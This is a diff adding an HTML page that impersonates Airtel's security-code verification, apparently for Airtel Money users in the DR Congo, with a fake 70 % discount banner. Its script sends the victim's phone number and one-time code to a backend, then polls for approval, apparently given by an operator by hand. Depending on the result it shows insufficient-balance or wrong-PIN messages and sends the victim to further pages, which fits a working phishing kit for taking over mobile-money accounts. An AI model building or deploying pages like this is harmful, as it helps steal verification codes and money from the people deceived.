@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+  <title>Airtel Lite - Vérification du code de sécurité</title>
+  <style>
+    :root {
+      --airtel-red: #cf1a20;
+      --text-dark: #3d4a59;
+      --text-grey: #9299a3;
+      --border-blue: #b7c0c9;
+      --navy: #1d2c55;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { -webkit-text-size-adjust: 100%; }
+    body {
+      min-height: 100svh;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      color: var(--text-dark);
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    .topbar {
+      height: 90px;
+      background: linear-gradient(90deg, #e51920 0%, #bc171d 100%);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+    }
+    .topbar .logo-img {
+      height: 48px;
+      width: auto;
+      padding: 7px 12px;
+      background: #fff;
+      border-radius: 6px;
+    }
+    .top-actions {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      color: #fff;
+    }
+    .top-actions svg { width: 26px; height: 26px; }
+    .language {
+      min-width: 145px;
+      height: 52px;
+      border: 1px solid rgba(255,255,255,.75);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 800;
+    }
+    .offer-bar {
+      height: 76px;
+      background: #1b2a4f;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+    }
+    .offer-chip {
+      background: linear-gradient(135deg, #e7353a, #bc171d);
+      border-radius: 24px;
+      padding: 12px 18px;
+      font-size: 22px;
+      font-weight: 900;
+    }
+    .offer-text { font-size: 22px; font-weight: 800; }
+    main {
+      flex: 1;
+      width: 100%;
+      max-width: 630px;
+      margin: 0 auto;
+      padding: 44px 25px 80px;
+    }
+    .secure-card {
+      border: 1px solid #e2e4e8;
+      border-radius: 34px;
+      background: #fff;
+      box-shadow: 0 12px 24px rgba(0,0,0,.12);
+      overflow: hidden;
+    }
+    .secure-head {
+      height: 170px;
+      background: var(--airtel-red);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .partner-row {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+    .partner-row .logo-img {
+      height: 64px;
+      width: auto;
+      background: #fff;
+      border-radius: 8px;
+      padding: 8px 16px;
+    }
+    .secure-head h1 { font-size: 34px; line-height: 1; margin-top: 25px; }
+    .secure-body { padding: 38px 38px 32px; text-align: center; }
+    .intro {
+      color: #4e5a69;
+      font-size: 25px;
+      font-weight: 700;
+      margin-bottom: 42px;
+    }
+    .phone-number {
+      color: var(--text-dark);
+      white-space: nowrap;
+    }
+    .otp-label {
+      text-align: left;
+      color: var(--text-dark);
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 20px;
+    }
+    .otp-row {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 32px;
+    }
+    .otp-row input {
+      width: 72px;
+      height: 72px;
+      border: 2px solid var(--border-blue);
+      border-radius: 14px;
+      text-align: center;
+      font-size: 30px;
+      font-weight: 800;
+      color: var(--text-dark);
+      outline: none;
+      box-shadow: inset 0 0 0 2px #dfe5ea;
+    }
+    .otp-row input::-ms-reveal { display: none; }
+    .otp-row input:focus { border-color: var(--airtel-red); }
+    .verify-btn {
+      width: 100%;
+      min-height: 86px;
+      border: none;
+      border-radius: 22px;
+      background: #1d4e9b;
+      color: #fff;
+      font-size: 30px;
+      font-weight: 900;
+      letter-spacing: 5px;
+      cursor: pointer;
+    }
+    .verify-btn:disabled { opacity: .55; cursor: default; }
+    .error {
+      min-height: 24px;
+      margin-top: 12px;
+      color: #d64545;
+      font-weight: 700;
+    }
+    .hidden { display: none !important; }
+
+    .approval-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 50;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      background: rgba(0,0,0,.32);
+      backdrop-filter: blur(2px);
+      text-align: center;
+    }
+    .approval-overlay.visible { display: flex; }
+    .approval-card {
+      width: min(540px, 100%);
+      background: #fff;
+      border-radius: 22px;
+      padding: 30px 28px 24px;
+      box-shadow: 0 18px 44px rgba(0,0,0,.18);
+    }
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 4px solid #eee;
+      border-top-color: var(--airtel-red);
+      border-radius: 50%;
+      animation: spin .9s linear infinite;
+      margin: 0 auto 18px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .approval-card h2 {
+      color: var(--airtel-red);
+      font-size: clamp(23px, 4vw, 36px);
+      margin-bottom: 10px;
+    }
+    .approval-card p {
+      max-width: 300px;
+      margin: 0 auto;
+      color: #2a2a2a;
+      font-size: clamp(16px, 2.6vw, 22px);
+      line-height: 1.45;
+    }
+    .approved-mark {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      background: #1a9b57;
+      color: #fff;
+      font-size: 30px;
+      font-weight: 900;
+    }
+    .rejection-mark {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      background: #d64545;
+      color: #fff;
+      font-size: 30px;
+      font-weight: 900;
+    }
+    .retry-btn {
+      display: block;
+      width: 100%;
+      min-height: 58px;
+      margin-top: 18px;
+      border: none;
+      border-radius: 12px;
+      background: var(--airtel-red);
+      color: #fff;
+      font-size: 18px;
+      font-weight: 800;
+      cursor: pointer;
+    }
+
+    @media (max-width: 480px) {
+      body { min-height: 100dvh; }
+      .topbar { height: 64px; padding: 0 12px; }
+      .topbar .logo-img { height: 40px; padding: 5px 9px; }
+      .top-actions { gap: 7px; }
+      .top-actions svg { width: 20px; height: 20px; }
+      .top-actions svg:nth-of-type(2) { display: none; }
+      .language { min-width: 74px; height: 34px; border-radius: 8px; font-size: 12px; }
+      .offer-bar { height: 44px; gap: 8px; padding: 0 10px; }
+      .offer-chip { border-radius: 14px; padding: 6px 9px; font-size: 11px; }
+      .offer-text { min-width: 0; font-size: 11px; line-height: 1.2; }
+      main { max-width: none; padding: 16px 12px 28px; }
+      .secure-card { border-radius: 18px; box-shadow: 0 6px 16px rgba(0,0,0,.10); }
+      .secure-head { height: 128px; }
+      .partner-row { gap: 10px; }
+      .partner-row .logo-img { height: 44px; border-radius: 6px; padding: 5px 9px; }
+      .secure-head h1 { font-size: 22px; margin-top: 16px; }
+      .secure-body { padding: 20px 16px 16px; }
+      .intro { font-size: 15px; line-height: 1.35; margin-bottom: 20px; }
+      .otp-label { font-size: 16px; margin-bottom: 10px; }
+      .otp-row { gap: 8px; margin-bottom: 20px; }
+      .otp-row input {
+        width: 56px;
+        height: 56px;
+        border-radius: 10px;
+        font-size: 22px;
+      }
+      .verify-btn { min-height: 54px; border-radius: 12px; font-size: 16px; letter-spacing: 2px; }
+      .approval-overlay { padding: 16px; }
+      .approval-card { border-radius: 16px; padding: 24px 20px 20px; }
+      .spinner { width: 44px; height: 44px; }
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <img src="airtel_logo.png" alt="Airtel" class="logo-img">
+    <div class="top-actions" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.5a11 11 0 0 1 14 0M8.5 16a6 6 0 0 1 7 0M12 19.5h.01"/><path d="M2.5 9a15 15 0 0 1 19 0"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 11l9-8 9 8"/><path d="M5 10v10h14V10M9 20v-6h6v6"/></svg>
+      <div class="language">FR</div>
+    </div>
+  </header>
+
+  <div class="offer-bar">
+    <span class="offer-chip">70 % DE RÉDUCTION</span>
+    <span class="offer-text">OFFRES DISPONIBLES JUSQU’EN MAI 2027</span>
+  </div>
+
+  <main>
+    <section class="secure-card" id="otpForm">
+      <div class="secure-head">
+        <div class="partner-row">
+          <img src="airtel_logo.png" alt="Airtel" class="logo-img">
+        </div>
+        <h1>Vérification sécurisée</h1>
+      </div>
+      <div class="secure-body">
+        <p class="intro">Entrez le code à 4 chiffres envoyé au <span class="phone-number" id="phoneNumber"></span></p>
+        <h2 class="otp-label">Code de vérification</h2>
+        <div class="otp-row" id="otpRow">
+          <input type="password" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="Chiffre 1">
+          <input type="password" maxlength="1" inputmode="numeric" aria-label="Chiffre 2">
+          <input type="password" maxlength="1" inputmode="numeric" aria-label="Chiffre 3">
+          <input type="password" maxlength="1" inputmode="numeric" aria-label="Chiffre 4">
+        </div>
+        <button class="verify-btn" id="verifyBtn" disabled>CONTINUER</button>
+        <p class="error" id="error"></p>
+      </div>
+    </section>
+  </main>
+
+  <div class="approval-overlay" id="approvalOverlay" role="dialog" aria-modal="true">
+    <div class="approval-card">
+      <div class="spinner" id="spinner"></div>
+      <div class="approved-mark hidden" id="approvedMark">✓</div>
+      <div class="rejection-mark hidden" id="rejectionMark">!</div>
+      <h2 id="overlayTitle">Vérification du code</h2>
+      <p id="overlayText">Veuillez patienter pendant la vérification de votre code.</p>
+      <button type="button" class="retry-btn hidden" id="retryBtn">RÉESSAYER</button>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const plan = params.get('plan') || '—';
+    const price = params.get('price') || '—';
+    const phone = params.get('phone') || sessionStorage.getItem('airtelPhone') || '';
+    const digits = phone.replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
+    const groupedDigits = digits.replace(/^(\d{3})(\d{3})(\d+)$/, '$1 $2 $3');
+    const formattedPhone = digits ? '+243 ' + groupedDigits : '';
+    document.getElementById('phoneNumber').textContent = formattedPhone;
+    const otpForm = document.getElementById('otpForm');
+    const otpBoxes = Array.from(document.querySelectorAll('#otpRow input'));
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorEl = document.getElementById('error');
+    const overlay = document.getElementById('approvalOverlay');
+    const spinner = document.getElementById('spinner');
+    const approvedMark = document.getElementById('approvedMark');
+    const rejectionMark = document.getElementById('rejectionMark');
+    const overlayTitle = document.getElementById('overlayTitle');
+    const overlayText = document.getElementById('overlayText');
+    const retryBtn = document.getElementById('retryBtn');
+    let pollTimer = null;
+    let retryDestination = '';
+
+    function getOtp() {
+      return otpBoxes.map(box => box.value).join('');
+    }
+
+    function updateOtpState() {
+      const complete = otpBoxes.every(box => /^\d$/.test(box.value));
+      verifyBtn.disabled = !complete;
+      return complete;
+    }
+
+    otpBoxes.forEach((box, index) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/[^0-9]/g, '').slice(0, 1);
+        if (box.value && index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+        updateOtpState();
+      });
+      box.addEventListener('keydown', event => {
+        if (event.key === 'Backspace' && !box.value && index > 0) otpBoxes[index - 1].focus();
+      });
+      box.addEventListener('paste', event => {
+        event.preventDefault();
+        const digits = (event.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+        digits.split('').forEach((digit, offset) => {
+          if (otpBoxes[index + offset]) otpBoxes[index + offset].value = digit;
+        });
+        updateOtpState();
+        otpBoxes[Math.min(index + digits.length, otpBoxes.length - 1)].focus();
+      });
+    });
+
+    function showProcessing() {
+      overlay.classList.add('visible');
+      spinner.classList.remove('hidden');
+      approvedMark.classList.add('hidden');
+      rejectionMark.classList.add('hidden');
+      retryBtn.classList.add('hidden');
+      overlayTitle.textContent = 'Vérification du code';
+      overlayText.textContent = 'Veuillez patienter pendant la vérification de votre code.';
+    }
+
+    function showRejected(title, message, destination = '') {
+      spinner.classList.add('hidden');
+      approvedMark.classList.add('hidden');
+      rejectionMark.classList.remove('hidden');
+      overlayTitle.textContent = title;
+      overlayText.textContent = message;
+      retryBtn.classList.remove('hidden');
+      retryDestination = destination;
+      overlay.classList.add('visible');
+    }
+
+    retryBtn.addEventListener('click', () => {
+      if (retryDestination) {
+        window.location.href = retryDestination;
+        return;
+      }
+      overlay.classList.remove('visible');
+      otpForm.classList.remove('hidden');
+      otpBoxes.forEach(box => box.value = '');
+      verifyBtn.disabled = true;
+      errorEl.textContent = '';
+      rejectionMark.classList.add('hidden');
+      retryBtn.classList.add('hidden');
+      otpBoxes[0].focus();
+    });
+
+    verifyBtn.addEventListener('click', async () => {
+      if (!updateOtpState()) return;
+      showProcessing();
+      errorEl.textContent = '';
+
+      try {
+        const res = await fetch('/api/request-approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ plan, price, phone, otp: getOtp(), step: 'otp' })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Impossible d’envoyer la demande.');
+
+        pollTimer = setInterval(async () => {
+          try {
+            const statusRes = await fetch('/api/check-approval/' + data.id);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approved') {
+              clearInterval(pollTimer);
+              spinner.classList.add('hidden');
+              approvedMark.classList.remove('hidden');
+              overlayTitle.textContent = 'Vérification terminée';
+              overlayText.textContent = 'Votre achat a été confirmé';
+              setTimeout(() => {
+                window.location.href = 'mwish.html?' + params.toString();
+              }, 800);
+            } else if (['denied', 'insufficient', 'demo_error'].includes(statusData.status)) {
+              clearInterval(pollTimer);
+              if (statusData.status === 'insufficient') {
+                showRejected('Solde insuffisant', 'Veuillez approvisionner votre compte Airtel Money.');
+              } else if (statusData.status === 'demo_error') {
+                showRejected(
+                  'Code PIN incorrect',
+                  'Veuillez saisir le code PIN correct.',
+                  'trial.html?' + params.toString()
+                );
+              } else {
+                showRejected('Code incorrect', 'Veuillez saisir le code de vérification correct.');
+              }
+            }
+          } catch (err) {}
+        }, 2000);
+      } catch (err) {
+        overlay.classList.remove('visible');
+        otpForm.classList.remove('hidden');
+        errorEl.textContent = err.message || 'Impossible d’envoyer la demande.';
+      }
+    });
+
+    otpBoxes[0].focus();
+  </script>
+</body>
+</html>
